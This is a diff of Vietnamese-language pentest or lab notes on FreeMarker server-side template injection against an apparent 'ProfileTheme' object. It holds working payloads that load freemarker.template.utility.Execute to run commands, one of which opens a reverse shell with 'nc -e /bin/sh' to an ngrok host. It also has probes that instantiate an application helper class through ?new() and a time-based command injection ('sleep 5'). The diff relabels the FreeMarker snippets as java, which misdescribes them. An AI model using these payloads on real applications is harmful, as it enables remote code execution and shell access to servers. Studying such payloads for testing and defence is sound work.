@@ -4031,13 +4031,13 @@ Nếu probe bằng `email.class...` bị null/missing, đó là expected behavio
 
 Payload object-chain dùng `ProfileTheme` làm anchor và tránh double quote:
 
-```ftl
+```java
 <#assign classloader=profileTheme.class.protectionDomain.classLoader><#assign owc=classloader.loadClass('freemarker.template.ObjectWrapper')><#assign dwf=owc.getField('DEFAULT_WRAPPER').get(null)><#assign ec=classloader.loadClass('freemarker.template.utility.Execute')>${dwf.newInstance(ec,null)('id')}
 ```
 
 Nếu cần OOB command trong lab:
 
-```ftl
+```java
 <#assign classloader=profileTheme.class.protectionDomain.classLoader><#assign owc=classloader.loadClass('freemarker.template.ObjectWrapper')><#assign dwf=owc.getField('DEFAULT_WRAPPER').get(null)><#assign ec=classloader.loadClass('freemarker.template.utility.Execute')>${dwf.newInstance(ec,null)('nc -e /bin/sh 0.tcp.ap.ngrok.io <port>')}
 ```
 
@@ -4047,7 +4047,33 @@ Khi command output không hiển thị rõ trong response, dùng marker side eff
 
 Nếu object-chain bị chặn nhưng `?new()` còn instantiate được application `TemplateModel`, có thể detect helper:
 
-```ftl
+```java
+<#attempt><#assign qr='org.example.util.QRCodeHelper'?new()>QRCLASS-OK<#recover>QRCLASS-ERR-${.error?html}</#attempt>
+```
+
+Nếu thấy `QRCLASS-OK`, chứng minh được:
+
+```
+Freemarker ?new()
+-> org.example.util.QRCodeHelper tồn tại
+-> SAFER_RESOLVER cho instantiate class này
+```
+
+Thử gọi helper an toàn:
+
+```java
+<#attempt><#assign qr='org.example.util.QRCodeHelper'?new()>QRCALL-${qr('probe@example.com')?has_content?c}-END<#recover>QRCALL-ERR-${.error?html}</#attempt>
+```
+
+Signal tốt:
+
+```
+QRCALL-true-END
+```
+
+Thử payload time-based command injection:
+
+```java
 <#assign qr='org.example.util.QRCodeHelper'?new()>${qr('blackbox; sleep 5; #')}
 ```
 
